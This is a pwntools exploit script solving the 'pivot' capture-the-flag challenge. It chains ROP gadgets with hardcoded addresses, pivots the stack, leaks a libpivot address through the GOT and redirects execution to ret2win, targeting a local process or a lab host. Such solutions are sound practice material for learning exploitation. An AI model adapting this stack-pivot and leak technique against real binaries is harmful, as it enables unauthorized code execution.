#!/usr/bin/env python3

from pwn import *

e = ELF("./pivot")
libc = ELF("./libpivot.so")
context.binary = e  # Set the target binary for pwntools
context.terminal = ["kitty", "-e"]  # Terminal to use for GDB debugging
HOST = "10.10.10.10"  # Remote host IP
PORT = 1337  # Remote port

gdb_script = """
b main
continue
"""

def conn():
    # Start local process with optional GDB or connect to remote
    if args.LOCAL:
        p = process([e.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    p = conn()  # Establish connection to target
    
    popRAX          = 0x00000000004009bb # pop    rax
    popRDI          = 0x0000000000400a33 # pop    rdi
    xchgRSP_RAX     = 0x00000000004009bd # xchg   rsp,rax
    foothold        = 0x0000000000400720 # foothold_function@plt
    foothold_got    = 0x0000000000601040 # readelf -r pivot | grep foothold
    ret2win_offset  = 0x0000000000000a81 # 146 FUNC    GLOBAL DEFAULT   12 ret2win
    pwnme           = 0x00000000004008f1 # pwnme
    main            = 0x0000000000400847
    foothold_offset = 0x000000000000096a

    offset = 40  # Offset to control return address
    
    payload1 = []
    payload1.append(foothold)
    payload1.extend([popRDI, foothold_got])
    payload1.append(e.plt['puts'])
    payload1.append(pwnme)
    payload1.append(main)
    payload1 = flat(payload1)  # Flatten payload for sending
    p.sendline(payload1)
    
    pivot_addr = int(p.recvline_startswith(b'The Old').split(b'The Old Gods kindly bestow upon you a place to pivot: ')[1].strip(b'\n'), 16)

    info(f"pivot: {hex(pivot_addr)}")

    payload2 = []
    payload2.extend([popRAX, pivot_addr])
    payload2.append(xchgRSP_RAX)
    payload2 = flat({offset: payload2})  # Flatten payload for sending
    p.sendline(payload2)

    p.recvuntil(b'libpivot\n')
    leak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
    print(hex(leak))
    p.sendline(b'')
    payload3 = flat({offset: [leak - foothold_offset + ret2win_offset]})
    p.sendline(payload3)
    


    p.interactive()  # Hand over interaction to user for shell or output

if __name__ == "__main__":
    main()

